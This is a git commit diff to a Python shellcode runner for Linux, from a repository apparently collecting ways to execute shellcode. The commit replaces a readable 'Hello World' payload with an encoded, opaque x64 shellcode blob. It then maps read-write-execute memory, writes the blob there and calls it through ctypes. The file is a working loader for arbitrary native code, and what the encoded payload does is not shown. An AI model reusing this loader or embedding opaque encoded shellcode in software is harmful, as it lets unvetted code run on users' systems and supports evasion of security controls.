7e394cd8a4745c65ee624c938c4dff80e7e69696
mauricelambert <50479118+mauricelambert@users.noreply.github.com>
2023-07-03 17:30:43 +0000

    Review and beautify the code

--- shellcode_runner_linux.py
+++ shellcode_runner_linux.py
@@ -25,7 +25,7 @@ This repository implements multiples way to execute
 shellcode with different platforms, systems and languages.
 """
 
-__version__ = "0.0.1"
+__version__ = "0.2.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -50,20 +50,21 @@ __all__ = []
 
 print(copyright)
 
-import ctypes
-import mmap
+from ctypes import CFUNCTYPE, c_void_p, string_at
+from mmap import mmap, PAGESIZE, MAP_SHARED, PROT_READ, PROT_WRITE, PROT_EXEC
 
-shellcode = b"hed \x0b\x814$\x01\x01\x01\x01H\xb8 shellcoPH\xb8rld fromPH\xb8Hello WoPj\x01Xj\x01_j\x1cZH\x89\xe6\x0f\x05XXXX\xc3"
-mem = mmap.mmap(
-    -1,
-    mmap.PAGESIZE,
-    mmap.MAP_SHARED,
-    mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
+shellcode = (
+    b"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef"
+    b"\xff\xff\xff\x48\xbb\xb0\x1d\x22\xf6\x8b\x86\xb8\xe6\x48"
+    b"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf8\xa5\x0d"
+    b"\x94\xe2\xe8\x97\x95\xd8\x1d\xbb\xa6\xdf\xd9\xea\x80\xd8"
+    b"\x30\x41\xa2\xd5\xd4\x50\xf7\xb0\x1d\x22\x93\xe8\xee\xd7"
+    b"\xc6\xf8\x78\x4e\x9a\xe4\xa6\xef\x89\xc2\x71\x46\xf6\xdd"
+    b"\xd1\xec\xb8\xda\x26\x7a\xf9\x8e\x86\xb8\xe6"
 )
-mem.write(shellcode)
-addr = int.from_bytes(ctypes.string_at(id(mem) + 16, 8), "little")
-print(hex(addr))
-functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
-fn = functype(addr)
-fn()
-print("Back to python!")
+memory = mmap(-1, PAGESIZE, MAP_SHARED, PROT_READ | PROT_WRITE | PROT_EXEC,)
+memory.write(shellcode)
+pointer = int.from_bytes(string_at(id(memory) + 16, 8), "little")
+functype = CFUNCTYPE(c_void_p)
+function = functype(pointer)
+function()
